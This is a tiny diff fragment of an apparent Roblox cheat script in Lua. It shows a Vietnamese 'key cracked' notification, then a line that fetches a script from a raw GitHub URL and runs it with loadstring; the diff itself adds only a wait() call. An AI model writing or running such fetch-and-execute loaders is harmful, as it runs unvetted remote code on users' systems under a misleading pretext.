@@ -2701,4 +2701,5 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = "Đang Bẻ Khóa", -- Required
 	Text = "Bẻ Khóa thành công Key = ip" -- Required
 })
+wait()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/krymmirai/another/main/test",true))()
